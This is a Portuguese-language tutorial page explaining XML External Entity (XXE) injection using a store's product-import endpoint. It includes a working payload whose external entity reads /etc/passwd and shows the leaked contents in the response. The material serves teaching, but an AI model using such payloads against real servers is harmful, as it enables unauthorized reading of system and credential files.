# XML External Entity (XXE)

Ocorre quando um parser XML processa entidades externas controladas pelo usuário, podendo permitir a leitura de arquivos locais ou o acesso a recursos externos pelo servidor.

## Exploração

Observe esta funcionalidade de uma loja, que permite cadastrar um produto enviando um documento XML: 
![xmlexternalentity-imagem1.png](/guias-categoria/imagens/xmlexternalentity-imagem1.png)

Considere que o servidor receba o XML, leia o nome do produto e o devolva na resposta, desta maneira:

```text
POST /importar-produto
  xml = interpretar(@corpo)
  responder "Produto importado: " + xml.produto.nome
```

Onde `@corpo` é o XML enviado pelo usuário.

No uso normal, a requisição e a resposta são estas:

```http
POST /importar-produto
Content-Type: application/xml

<produto>
  <nome>Caneca</nome>
</produto>
```

```text
Produto importado: Caneca
```

### O recurso do XML que torna isso possível

O XML permite declarar, no início do documento, **entidades**: atalhos que o parser substitui por um valor ao interpretar o texto. Veja um uso legítimo:

```xml
<!DOCTYPE produto [
  <!ENTITY marca "Caneca Premium">
]>
<produto>
  <nome>&marca;</nome>
</produto>
```

Ao ler esse documento, o parser troca `&marca;` por `Caneca Premium`, e o nome do produto passa a ser esse texto. Uma entidade também pode ser declarada como **externa**, usando `SYSTEM`: nesse caso, o valor não está escrito no documento, e sim no endereço indicado, que o parser vai buscar por conta própria.

Se o parser estiver configurado para aceitar entidades externas, um usuário mal intencionado pode enviar um documento que aponta para um arquivo do servidor:

```xml
<?xml version="1.0"?>
<!DOCTYPE produto [
  <!ENTITY arquivo SYSTEM "file:///etc/passwd">
]>
<produto>
  <nome>&arquivo;</nome>
</produto>
```

Como o servidor devolve o nome do produto na resposta, o conteúdo do arquivo aparece nela:

```text
Produto importado: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

- `<!DOCTYPE produto [ ... ]>` é a área do documento em que o atacante declara suas próprias entidades. Ela faz parte do XML, então o servidor a interpreta como qualquer outra parte.
- `<!ENTITY arquivo SYSTEM "file:///etc/passwd">` define a entidade `arquivo` como o conteúdo do arquivo `/etc/passwd` do servidor.
- `&arquivo;` dentro de `<nome>` faz o parser substituir a referência pelo conteúdo do arquivo antes de a aplicação ler o valor. Para a aplicação, o "nome do produto" simplesmente passou a ser esse texto.